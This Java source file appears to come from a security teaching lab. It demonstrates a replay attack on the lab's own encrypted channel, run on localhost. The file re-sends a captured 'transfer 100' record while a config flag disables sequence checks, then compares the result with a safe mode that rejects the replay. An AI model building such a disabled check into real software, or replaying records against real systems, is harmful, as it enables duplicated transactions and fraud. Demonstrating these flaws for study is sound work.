package com.pqcaps.attacklab;

import com.pqcaps.classical.ClassicalCryptoSuite;
import com.pqcaps.classical.ClassicalHandshake;
import com.pqcaps.classical.ClassicalSecureChannel;
import com.pqcaps.common.EncryptedRecord;
import com.pqcaps.common.HandshakeConfig;
import com.pqcaps.common.SessionKeys;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicReference;

/**
 * ATTACK 3: Replay Attack (exploits VULN-2).
 *
 * <p><b>The Weakness</b>: In Phase 1, the secure channel receiver does NOT enforce
 * monotonic sequence numbers ({@code HandshakeConfig.skipSequenceCheck = true}).
 *
 * <p><b>The Attack</b>: The attacker observes the encrypted stream, records a valid
 * {@link EncryptedRecord} (e.g. "transfer 100" at sequence number 0), and re-injects
 * that identical record into the session later. Because sequence verification is disabled,
 * the receiver decrypts and executes the same transaction a second time.
 *
 * <p>In safe mode ({@code skipSequenceCheck = false}), the receiver detects that
 * the sequence number is out-of-order and rejects the replayed record with a SecurityException.
 */
public final class ReplayAttack {

    private static final String LOCALHOST = "127.0.0.1";

    public static void main(String[] args) {
        System.out.println("======================================================================");
        System.out.println("  ATTACK 3: Replay Attack (exploiting VULN-2)");
        System.out.println("======================================================================");

        System.out.println("\n--- Step 1: Running with vulnerable server (skipSequenceCheck=true) ---");
        AttackResult vulnResult = execute(true);
        System.out.println("Vulnerable Mode Success : " + vulnResult.success());
        System.out.println("Evidence                : " + vulnResult.evidence());

        System.out.println("\n--- Step 2: Running with secure server (skipSequenceCheck=false) ---");
        AttackResult safeResult = execute(false);
        System.out.println("Secure Mode Success     : " + safeResult.success() + " (attack should be blocked)");
        System.out.println("Evidence                : " + safeResult.evidence());
    }

    /**
     * Executes the replay attack against the secure channel.
     *
     * @param vulnerable if true, receiver skips sequence check (VULN-2 active);
     *                   if false, receiver validates sequence numbers.
     * @return the AttackResult summarizing whether duplicate records were accepted.
     */
    public static AttackResult execute(boolean vulnerable) {
        ensureLocalhost();
        KeyPair serverIdentity = ClassicalCryptoSuite.getInstance().signatureScheme().generateKeyPair();
        HandshakeConfig config = HandshakeConfig.vulnerable().withSkipSequenceCheck(vulnerable);

        CountDownLatch serverReady = new CountDownLatch(1);
        int[] portHolder = new int[1];

        List<String> serverProcessed = new ArrayList<>();
        List<Long> serverSeenSeqs    = new ArrayList<>();
        AtomicReference<String> failureReason = new AtomicReference<>();

        // ── 1. Target Server Thread ──────────────────────────────────────────
        Thread serverThread = new Thread(() -> {
            try (ServerSocket ss = new ServerSocket(0, 50, java.net.InetAddress.getByName(LOCALHOST))) {
                portHolder[0] = ss.getLocalPort();
                serverReady.countDown();

                try (Socket clientConn = ss.accept()) {
                    SessionKeys keys = ClassicalHandshake.serverHandshake(clientConn, config, serverIdentity);
                    try (ClassicalSecureChannel channel = new ClassicalSecureChannel(clientConn, keys, false, config)) {
                        // Expect 3 records: #1 normal (seq 0), #2 normal (seq 1), #3 replayed (seq 0)
                        for (int i = 0; i < 3; i++) {
                            try {
                                byte[] msg = channel.receive();
                                String text = new String(msg, StandardCharsets.UTF_8);
                                synchronized (serverProcessed) {
                                    serverProcessed.add(text);
                                }
                                System.out.printf("[SERVER] Accepted record #%d: \"%s\"%n", i + 1, text);
                            } catch (SecurityException se) {
                                failureReason.set("Server rejected out-of-order record: " + se.getMessage());
                                System.out.println("[SERVER] " + failureReason.get());
                                break;
                            }
                        }
                    }
                }
            } catch (Exception e) {
                // Connection closed
            }
        }, "replay-server");
        serverThread.setDaemon(true);
        serverThread.start();

        // ── 2. Client & Attacker Execution ────────────────────────────────────
        try {
            serverReady.await();
            try (Socket socket = new Socket(LOCALHOST, portHolder[0])) {
                SessionKeys keys = ClassicalHandshake.clientHandshake(
                        socket, config.withSkipKeyPinning(true), null);

                ObjectOutputStream wireOut = new ObjectOutputStream(socket.getOutputStream());
                wireOut.flush();
                ObjectInputStream wireIn = new ObjectInputStream(socket.getInputStream());

                ClassicalSecureChannel clientChannel = new ClassicalSecureChannel(
                        wireOut, wireIn, keys, true, config);

                // Send Record 1: "transfer 100" (seq 0)
                byte[] p1 = "transfer 100".getBytes(StandardCharsets.UTF_8);
                byte[] nonce0 = ClassicalSecureChannel.buildNonce(0);
                byte[] aad0   = ClassicalSecureChannel.buildAad(0);
                byte[] c1     = new com.pqcaps.classical.AesGcmCipher().encrypt(
                        keys.clientToServer(), nonce0, aad0, p1);
                EncryptedRecord record0 = new EncryptedRecord(0L, nonce0, c1);

                System.out.printf("[CLIENT] Sending record 1 (seq=%d, nonce=%s...): \"transfer 100\"%n",
                        record0.sequenceNumber(), ClassicalHandshake.hex4(record0.nonce()));
                wireOut.writeObject(record0);
                wireOut.flush();

                Thread.sleep(50);

                // Send Record 2: "check balance" (seq 1)
                byte[] p2 = "check balance".getBytes(StandardCharsets.UTF_8);
                byte[] nonce1 = ClassicalSecureChannel.buildNonce(1);
                byte[] aad1   = ClassicalSecureChannel.buildAad(1);
                byte[] c2     = new com.pqcaps.classical.AesGcmCipher().encrypt(
                        keys.clientToServer(), nonce1, aad1, p2);
                EncryptedRecord record1 = new EncryptedRecord(1L, nonce1, c2);

                System.out.printf("[CLIENT] Sending record 2 (seq=%d, nonce=%s...): \"check balance\"%n",
                        record1.sequenceNumber(), ClassicalHandshake.hex4(record1.nonce()));
                wireOut.writeObject(record1);
                wireOut.flush();

                Thread.sleep(50);

                // ATTACK: Replay Record 1 (seq 0) again on the same channel!
                System.out.printf("[ATTACKER] Re-injecting captured record (seq=%d, nonce=%s...): \"transfer 100\"%n",
                        record0.sequenceNumber(), ClassicalHandshake.hex4(record0.nonce()));
                wireOut.writeObject(record0);
                wireOut.flush();

                Thread.sleep(100);
            }
        } catch (Exception e) {
            failureReason.set("Client failed: " + e.getMessage());
        }

        try {
            serverThread.join(2000);
        } catch (InterruptedException ignored) {}

        long transfer100Count;
        synchronized (serverProcessed) {
            transfer100Count = serverProcessed.stream().filter("transfer 100"::equals).count();
        }

        boolean attackSuccess = (transfer100Count == 2);
        String evidence = attackSuccess
                ? String.format("Replay succeeded! 'transfer 100' processed %d times (seq=0 accepted twice without sequence check).", transfer100Count)
                : "Replay failed: " + (failureReason.get() != null ? failureReason.get() : "Duplicate record was rejected.");

        return new AttackResult(
                "Replay Attack",
                attackSuccess,
                evidence,
                "VULN-2"
        );
    }

    private static void ensureLocalhost() {
        if (!"127.0.0.1".equals(LOCALHOST)) {
            throw new SecurityException("Localhost only: 127.0.0.1 required!");
        }
    }
}
